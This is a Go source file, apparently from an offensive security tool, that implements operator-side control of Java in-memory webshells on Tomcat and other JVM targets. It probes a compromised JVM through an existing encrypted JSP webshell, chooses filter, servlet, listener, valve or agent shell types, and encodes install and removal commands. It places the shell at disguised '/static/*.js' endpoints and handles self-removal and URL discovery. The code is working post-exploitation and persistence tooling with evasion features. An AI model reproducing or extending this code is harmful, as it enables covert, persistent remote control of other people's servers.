package scanner

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"
)

// Java 内存马类型。Tomcat 提供 filter/servlet/listener/valve，agent 是
// 独立于容器映射的 JVM 内 HTTP 监听（由同一个加密协议保护）。
const (
	MemshellTypeFilter   = "filter"
	MemshellTypeServlet  = "servlet"
	MemshellTypeListener = "listener"
	MemshellTypeValve    = "valve"
	MemshellTypeAgent    = "agent"
)

// MemshellTypes lists every installable Java memory-shell type.
var MemshellTypes = []string{
	MemshellTypeFilter,
	MemshellTypeServlet,
	MemshellTypeListener,
	MemshellTypeValve,
	MemshellTypeAgent,
}

// NormalizeMemshellType validates a user-supplied type.
func NormalizeMemshellType(t string) (string, bool) {
	t = strings.ToLower(strings.TrimSpace(t))
	for _, v := range MemshellTypes {
		if v == t {
			return t, true
		}
	}
	return "", false
}

// MemshellTypePreference is the auto-selection order for container-mapped
// types on Tomcat. Mapped types are preferred because they reuse the container
// connector; agent is the last resort for containers we cannot map into.
var MemshellTypePreference = []string{
	MemshellTypeFilter,
	MemshellTypeServlet,
	MemshellTypeListener,
	MemshellTypeValve,
}

// MemshellProbe is what the parent shell reported about the target JVM. It is
// the evidence auto-selection is made from, so it is kept verbatim.
type MemshellProbe struct {
	Container   string
	ServletAPI  string
	JavaVersion string
	Available   []string
}

// ParseMemshellProbe reads the probe ack fields into a typed view. Missing
// fields stay empty instead of being guessed.
func ParseMemshellProbe(fields map[string]string) MemshellProbe {
	p := MemshellProbe{
		Container:   strings.ToLower(strings.TrimSpace(fields["container"])),
		ServletAPI:  strings.ToLower(strings.TrimSpace(fields["servlet_api"])),
		JavaVersion: strings.TrimSpace(fields["java_version"]),
	}
	for _, v := range strings.Split(fields["types"], ",") {
		if v = strings.ToLower(strings.TrimSpace(v)); v != "" {
			p.Available = append(p.Available, v)
		}
	}
	return p
}

// Has reports whether the target JVM advertised the given type.
func (p MemshellProbe) Has(typ string) bool {
	for _, v := range p.Available {
		if v == typ {
			return true
		}
	}
	return false
}

// Describe renders the probe as a stable evidence string.
func (p MemshellProbe) Describe() string {
	return fmt.Sprintf("container=%s api=%s java=%s available=%s",
		displayProbe(p.Container), displayProbe(p.ServletAPI), displayProbe(p.JavaVersion),
		displayProbe(strings.Join(p.Available, ",")))
}

func displayProbe(v string) string {
	if strings.TrimSpace(v) == "" {
		return "unknown"
	}
	return v
}

// MemshellSelection is the outcome of type selection, carrying why the type was
// chosen so the operator can audit an automatic decision.
type MemshellSelection struct {
	Type   string `json:"type"`
	Auto   bool   `json:"auto"`
	Reason string `json:"reason"`
}

// SelectMemshellType decides which memory-shell type to install. An explicit
// operator choice is validated against the probe (overrides are kept); an empty
// choice is resolved automatically from the probe. Mismatches always fail with
// the observed environment named, never silently fall back to an unverified
// type.
func SelectMemshellType(p MemshellProbe, requested string) (MemshellSelection, error) {
	if req := strings.TrimSpace(requested); req != "" {
		typ, ok := NormalizeMemshellType(req)
		if !ok {
			return MemshellSelection{}, fmt.Errorf("type 必须是 %s", strings.Join(MemshellTypes, "/"))
		}
		if err := checkMemshellFit(p, typ); err != nil {
			return MemshellSelection{}, err
		}
		return MemshellSelection{Type: typ, Auto: false,
			Reason: "人工指定 " + typ + "；目标环境 " + p.Describe()}, nil
	}
	if len(p.Available) == 0 {
		return MemshellSelection{}, fmt.Errorf("目标 JVM 未报告任何可用的内存马类型，拒绝盲选（%s）", p.Describe())
	}
	if p.Container == "tomcat" {
		for _, typ := range MemshellTypePreference {
			if p.Has(typ) {
				return MemshellSelection{Type: typ, Auto: true,
					Reason: fmt.Sprintf("自动选型：容器为 Tomcat，按 %s 优先级取 %s；目标环境 %s",
						strings.Join(MemshellTypePreference, "→"), typ, p.Describe())}, nil
			}
		}
	}
	if p.Has(MemshellTypeAgent) {
		reason := "自动选型：目标容器为 " + displayProbe(p.Container) + "，不支持容器映射，回退 agent；目标环境 " + p.Describe()
		if p.Container == "tomcat" {
			reason = "自动选型：容器为 Tomcat 但未报告可映射类型，回退 agent；目标环境 " + p.Describe()
		}
		return MemshellSelection{Type: MemshellTypeAgent, Auto: true, Reason: reason}, nil
	}
	return MemshellSelection{}, fmt.Errorf("目标 JVM 没有可用的内存马类型（%s）", p.Describe())
}

// checkMemshellFit validates one type against the probe.
func checkMemshellFit(p MemshellProbe, typ string) error {
	if typ != MemshellTypeAgent && p.Container != "tomcat" {
		return fmt.Errorf("目标容器不是 Tomcat，当前仅支持 agent 型内存马（%s）", p.Describe())
	}
	if !p.Has(typ) {
		return fmt.Errorf("目标 JVM 不支持 %s 型内存马（可用：%s）", typ,
			displayProbe(strings.Join(p.Available, ",")))
	}
	return nil
}

// MemshellSpec is one install request handed to the parent JSP shell.
type MemshellSpec struct {
	Type    string
	Name    string
	Path    string
	Key     []byte
	Carrier string
	Port    int // agent 型监听端口；0 表示自动分配
}

// GenerateMemshellName returns a container-safe unique registration name.
func GenerateMemshellName() (string, error) {
	s, err := randomHex(6)
	if err != nil {
		return "", err
	}
	return "ms_" + s, nil
}

// GenerateMemshellPath returns a low-profile endpoint below /static/.
func GenerateMemshellPath() (string, error) {
	s, err := randomHex(8)
	if err != nil {
		return "", err
	}
	return "/static/" + s + ".js", nil
}

// ValidateMemshellSpec rejects values that would break the compact M record.
func ValidateMemshellSpec(spec MemshellSpec) error {
	if _, ok := NormalizeMemshellType(spec.Type); !ok {
		return errors.New("不支持的内存马类型")
	}
	if !validMemshellValue(spec.Name) {
		return errors.New("内存马名称无效")
	}
	if !validMemshellValue(spec.Path) || !strings.HasPrefix(spec.Path, "/") {
		return errors.New("内存马路径无效")
	}
	if len(spec.Key) != 32 {
		return errors.New("内存马密钥必须是 32 字节")
	}
	if !shellCarrierPattern.MatchString(spec.Carrier) {
		return errors.New("内存马载体名称无效")
	}
	if spec.Port < 0 || spec.Port > 65535 {
		return errors.New("监听端口无效")
	}
	return nil
}

func validMemshellValue(v string) bool {
	if v == "" || len(v) > 200 {
		return false
	}
	for _, r := range v {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '_' || r == '.' || r == '/' || r == '-':
		default:
			return false
		}
	}
	return true
}

// MemshellWireInstall encodes an install request for the parent JSP's M op.
func MemshellWireInstall(spec MemshellSpec) ([]byte, error) {
	if err := ValidateMemshellSpec(spec); err != nil {
		return nil, err
	}
	parts := []string{
		"action=install",
		"type=" + spec.Type,
		"name=" + spec.Name,
		"path=" + spec.Path,
		"key=" + EncodeShellKey(spec.Key),
		"carrier=" + spec.Carrier,
	}
	if spec.Port > 0 {
		parts = append(parts, fmt.Sprintf("port=%d", spec.Port))
	}
	return shellWireOp('M', []byte(strings.Join(parts, "&"))), nil
}

// MemshellWireRemove encodes a removal request for the parent JSP's M op.
func MemshellWireRemove(kind, name, path string) ([]byte, error) {
	if _, ok := NormalizeMemshellType(kind); !ok {
		return nil, errors.New("不支持的内存马类型")
	}
	if !validMemshellValue(name) {
		return nil, errors.New("内存马名称无效")
	}
	if path != "" && !validMemshellValue(path) {
		return nil, errors.New("内存马路径无效")
	}
	return shellWireOp('M', []byte("action=remove&type="+kind+"&name="+name+"&path="+path)), nil
}

// MemshellWireProbe asks the parent shell what the target JVM supports.
func MemshellWireProbe() []byte {
	return shellWireOp('M', []byte("action=probe"))
}

// MemshellPayload builds the client-side payload for an injected memory shell.
// It speaks the same v2 channel as a JSP file shell but with its own key.
func MemshellPayload(key []byte, carrier string) (ShellPayload, error) {
	if len(key) != 32 {
		return ShellPayload{}, errors.New("内存马密钥必须是 32 字节")
	}
	if !shellCarrierPattern.MatchString(carrier) {
		return ShellPayload{}, errors.New("内存马载体名称无效")
	}
	return ShellPayload{
		Type:       "jsp",
		Protocol:   ShellProtocolV2,
		Key:        append([]byte{}, key...),
		Carrier:    carrier,
		KeyVersion: 1,
	}, nil
}

// SendShellWire sends one encrypted op through an existing v2 shell.
func SendShellWire(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, wire []byte) (string, error) {
	if p.Protocol != ShellProtocolV2 {
		return "", errors.New("只有加密 v2 webshell 支持该操作")
	}
	req, err := p.v2Request(shellURL, wire)
	if err != nil {
		return "", err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("webshell 返回 HTTP %d（认证失败、重放或 shell 已失效）", resp.StatusCode)
	}
	return decodeShellResponse(p, resp.Body)
}

// ParseMemshellAck parses the plaintext ack of an M operation:
//
//	MSOK\nk=v\n...
//	MSERR\nmsg=...
func ParseMemshellAck(out string) (string, map[string]string, error) {
	lines := strings.Split(strings.ReplaceAll(out, "\r\n", "\n"), "\n")
	if len(lines) == 0 {
		return "", nil, errors.New("内存马响应为空")
	}
	code := strings.TrimSpace(lines[0])
	if code != "MSOK" && code != "MSERR" && code != "MSINFO" {
		return "", nil, fmt.Errorf("内存马响应语义异常: %s", truncateForError(out))
	}
	fields := map[string]string{}
	for _, line := range lines[1:] {
		if line == "" {
			continue
		}
		k, v, ok := strings.Cut(line, "=")
		if !ok {
			continue
		}
		fields[strings.TrimSpace(k)] = v
	}
	return code, fields, nil
}

func truncateForError(s string) string {
	s = strings.TrimSpace(s)
	if len(s) > 80 {
		return s[:80] + "..."
	}
	return s
}

// MemshellSelfDeleteOK / MemshellSelfDeleteFailed are the D-op markers used by
// the injected runtime. They start with "_" so the polymorphic renamer leaves
// them untouched.
const (
	MemshellSelfDeleteOK     = "__JWMS_DEL_OK__"
	MemshellSelfDeleteFailed = "__JWMS_DEL_FAIL__"
)

// MemshellSelfRemove asks an injected memory shell to unregister itself.
func MemshellSelfRemove(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload) (string, error) {
	if p.Protocol != ShellProtocolV2 {
		return "", errors.New("只有加密 v2 内存马支持自移除")
	}
	req, err := p.v2Request(shellURL, shellWireDelete())
	if err != nil {
		return "", err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("内存马返回 HTTP %d", resp.StatusCode)
	}
	out, err := decodeShellResponse(p, resp.Body)
	if err != nil {
		return "", fmt.Errorf("自移除回执无效: %v", err)
	}
	return strings.TrimSpace(out), nil
}

// VerifyMemshellRemoved confirms the endpoint no longer speaks the protocol.
// A closed agent port is treated as removed; ambiguous HTTP errors are not.
// Agent shells answer the delete ack before their own listener stops, so the
// alive path is retried briefly for agents instead of failing on the race.
func VerifyMemshellRemoved(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, allowClosed bool) (bool, string) {
	deadline := time.Now().Add(4 * time.Second)
	var note string
	for {
		var alive bool
		alive, note = CheckShellAlive(ctx, c, shellURL, p)
		if !alive {
			break
		}
		if !allowClosed || time.Now().After(deadline) {
			return false, "内存马仍响应协议请求"
		}
		select {
		case <-ctx.Done():
			return false, "复核请求被取消"
		case <-time.After(400 * time.Millisecond):
		}
	}
	resp := c.Do(ctx, DeepRequest{Method: "GET", URL: shellURL})
	switch {
	case resp.Error != "":
		if allowClosed {
			return true, "监听端口已关闭（" + note + "）"
		}
		return false, "复核请求失败：" + resp.Error + "（协议探测：" + note + "）"
	case resp.StatusCode == 404 || resp.StatusCode == 410:
		return true, fmt.Sprintf("HTTP %d，协议请求已被拒绝", resp.StatusCode)
	case resp.StatusCode >= 200 && resp.StatusCode < 400:
		if _, err := decodeShellResponse(p, resp.Body); err != nil {
			return true, fmt.Sprintf("HTTP %d，响应中无协议标记", resp.StatusCode)
		}
		return false, "响应仍包含有效协议回执"
	}
	return false, fmt.Sprintf("HTTP %d，无法确认已移除", resp.StatusCode)
}

// MemshellURLsFor derives the candidate endpoints of an injected shell from the
// parent shell URL. Filter/servlet/listener/valve mappings belong to the web
// application context that owns the parent shell, so a shell at /lab/upload/
// x.jsp answers under /lab<path> (and possibly /lab/upload<path>), never only
// under the bare path. Agent shells listen on their own port and have no
// context. Every candidate is returned in the order it should be probed; only
// the context that actually registered the mapping replies with this shell's
// key, so trying the others is harmless.
func MemshellURLsFor(parentURL, shellPath string, port int) ([]string, error) {
	u, err := url.Parse(strings.TrimSpace(parentURL))
	if err != nil || u.Hostname() == "" {
		return nil, errors.New("父 webshell 地址无效")
	}
	scheme := u.Scheme
	if scheme == "" {
		scheme = "http"
	}
	host := u.Host
	if port > 0 {
		return []string{"http://" + net.JoinHostPort(u.Hostname(), fmt.Sprintf("%d", port)) + shellPath}, nil
	}
	out := []string{}
	seen := map[string]bool{}
	add := func(prefix string) {
		candidate := scheme + "://" + host + strings.TrimSuffix(prefix, "/") + shellPath
		if seen[candidate] {
			return
		}
		seen[candidate] = true
		out = append(out, candidate)
	}
	acc := ""
	for _, segment := range strings.Split(strings.Trim(u.Path, "/"), "/") {
		if segment == "" || strings.Contains(segment, ".") {
			continue
		}
		acc += "/" + segment
		add(acc)
	}
	add("")
	return out, nil
}
